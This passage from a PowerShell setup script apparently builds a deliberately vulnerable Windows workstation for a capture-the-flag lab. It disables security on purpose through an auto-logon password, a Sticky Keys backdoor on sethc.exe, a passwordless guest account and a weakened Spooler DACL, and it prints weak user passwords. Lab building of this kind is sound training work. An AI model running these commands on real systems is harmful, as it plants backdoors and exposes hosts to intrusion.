Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Value "Welcome1"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value 1

# Sticky Keys backdoor
takeown /f C:\Windows\System32\sethc.exe /a
icacls C:\Windows\System32\sethc.exe /grant Everyone:F
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe.bak -Force -ErrorAction SilentlyContinue

# Enable guest account for network access
net user guest /active:yes
net user guest ""

# Create vulnerable DACL on services
sc.exe sdset Spooler "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;RPWP;;;WD)"

# Cached domain credentials (simulate)
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 10 -Force

# Enable remote registry
Set-Service RemoteRegistry -StartupType Automatic
Start-Service RemoteRegistry

# Generate flag report if requested
if ($GenerateFlagReport) {
    $reportPath = Generate-FlagReport
}

Write-Host "`n==========================================" -ForegroundColor Green
Write-Host "Workstation vulnerability and CTF flag configuration complete!" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green
Write-Host ""
Write-Host "CTF FLAG STATISTICS:" -ForegroundColor Cyan
Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
Write-Host "  Total Points Available: $(($global:FlagList | Measure-Object -Property Points -Sum).Sum)" -ForegroundColor Yellow
Write-Host "  Difficulty Distribution:" -ForegroundColor Yellow
Write-Host "    Easy: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count) flags" -ForegroundColor Green
Write-Host "    Medium: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count) flags" -ForegroundColor DarkYellow
Write-Host "    Hard: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count) flags" -ForegroundColor Red
Write-Host ""
Write-Host "Flag Format: FLAG{$TeamIdentifier-WS-XXX}" -ForegroundColor Cyan
Write-Host ""
if ($GenerateFlagReport) {
    Write-Host "Flag report generated at: $reportPath" -ForegroundColor Green
    Write-Host "Open the HTML report for full flag details and hints!" -ForegroundColor Green
} else {
    Write-Host "To generate a detailed flag report, run with -GenerateFlagReport switch" -ForegroundColor Cyan
}
Write-Host ""
Write-Host "Vulnerable users created:" -ForegroundColor Cyan
Write-Host "  localadmin: admin123 (Admin)" -ForegroundColor Yellow
Write-Host "  jsmith: Welcome1 (Auto-logon)" -ForegroundColor Yellow
Write-Host "  mjones: Password1" -ForegroundColor Yellow
Write-Host "  developer: dev123" -ForegroundColor Yellow
Write-Host "  helpdesk: help123" -ForegroundColor Yellow
Write-Host ""
Write-Host "Key vulnerabilities:" -ForegroundColor Cyan
Write-Host "  - Auto-logon enabled (jsmith)" -ForegroundColor Yellow
Write-Host "  - Cached credentials in multiple locations" -ForegroundColor Yellow
Write-Host "  - Browser saved passwords" -ForegroundColor Yellow
Write-Host "  - Unquoted service paths" -ForegroundColor Yellow
Write-Host "  - DLL hijacking opportunities" -ForegroundColor Yellow
Write-Host "  - Multiple persistence mechanisms" -ForegroundColor Yellow
Write-Host ""
Write-Host "Server connection:" -ForegroundColor Cyan
Write-Host "  Configured to connect to: $ServerName" -ForegroundColor Yellow
Write-Host "  Network drive mapped: Z:" -ForegroundColor Yellow
Write-Host ""
Write-Host "REMINDER: This workstation is now EXTREMELY VULNERABLE!" -ForegroundColor Red
Write-Host "Only use in isolated lab environments!" -ForegroundColor Red
Write-Host ""
Write-Host "Please restart the workstation to ensure all changes take effect." -ForegroundColor Cyan
